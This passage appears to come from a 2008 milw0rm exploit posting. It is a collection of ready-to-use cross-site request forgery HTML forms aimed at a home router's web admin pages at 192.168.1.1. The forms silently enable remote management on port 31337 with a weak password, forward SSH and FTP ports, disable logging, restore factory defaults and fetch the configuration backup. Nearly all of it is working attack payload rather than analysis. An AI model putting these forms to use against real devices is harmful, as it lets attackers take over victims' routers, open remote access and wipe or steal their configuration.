&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Disable DMZ:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/dmz.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dmz_enable&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable remote management on port 31337 with password 'asdf', wireless web access and UPnP enabled:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/manage.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;remote_mgt_https&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;http_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;https_enable&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;PasswdModify&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;http_passwd&quot; value=&quot;asdf&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;http_passwdConfirm&quot; value=&quot;asdf&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;_http_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;web_wl_filter&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;remote_management&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;http_wanport&quot; value=&quot;31337&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;upnp_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable port forwarding on port 22, SSH, using TCP/UDP to 192.168.1.100:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/PortRange.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;RuleID_0&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;name0&quot; value=&quot;ssh&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;from0&quot; value=&quot;22&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;to0&quot; value=&quot;22&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;pro0&quot; value=&quot;both&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ip0&quot; value=&quot;100&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;enable0&quot; value=&quot;on&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable port forwarding on port 21, FTP, using TCP/UDP to 192.168.1.100:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/PortRange.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;RuleID_0&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;name0&quot; value=&quot;ftp&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;from0&quot; value=&quot;21&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;to0&quot; value=&quot;21&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;pro0&quot; value=&quot;both&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ip0&quot; value=&quot;100&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;enable0&quot; value=&quot;on&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable port triggering on ports 21 &amp; 22, FTP &amp; SSH, respectively:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/ptrigger.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;RuleID_0&quot; value=&quot;2&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;service_name0&quot; value=&quot;ssh&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;tfrom0&quot; value=&quot;22&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;tto0&quot; value=&quot;22&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;rfrom0&quot; value=&quot;22&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;rto0&quot; value=&quot;22&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;penable0&quot; value=&quot;on&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;RuleID_1&quot; value=&quot;2&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;service_name1&quot; value=&quot;ftp&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;tfrom1&quot; value=&quot;21&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;tto1&quot; value=&quot;21&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;rfrom1&quot; value=&quot;21&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;rto1&quot; value=&quot;21&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;penable1&quot; value=&quot;on&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable incoming/outgoing log:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/ctlog.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;log_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Disable incoming/outgoing log:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/ctlog.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;log_enable&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Ping a target URL five times:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/ping.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;start&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ping_ip&quot; value=&quot;kinqpinz.info&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ping_times&quot; value=&quot;5&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Trace route a target URL:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/tracert.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;start&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;traceroute_ip&quot; value=&quot;kinqpinz.info&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
DHCP release dynamic IP:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/rstatus.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;release&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wan_pro&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;conn_stats&quot; value=&quot;4294967295&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
DHCP renew dynamic IP:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/rstatus.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;renew&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wan_pro&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;conn_stats&quot; value=&quot;4294967295&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable VPN (IPSec/PPTP/L2TP) passthrough:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/vpn.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ipsec_pass&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;pptp_pass&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;l2tp_pass&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Disable VPN (IPSec/PPTP/L2TP) passthrough:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/vpn.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ipsec_pass&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;pptp_pass&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;l2tp_pass&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Restore factory defaults:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/factdefa.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;FactoryDefaults&quot; value=&quot;Yes&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Backup current configuration:

&lt;form method=&quot;get&quot; action=&quot;http://192.168.1.1/Config.bin&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;butAction&quot; value=&quot;Backup&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################

# milw0rm.com [2008-03-26]</pre></html>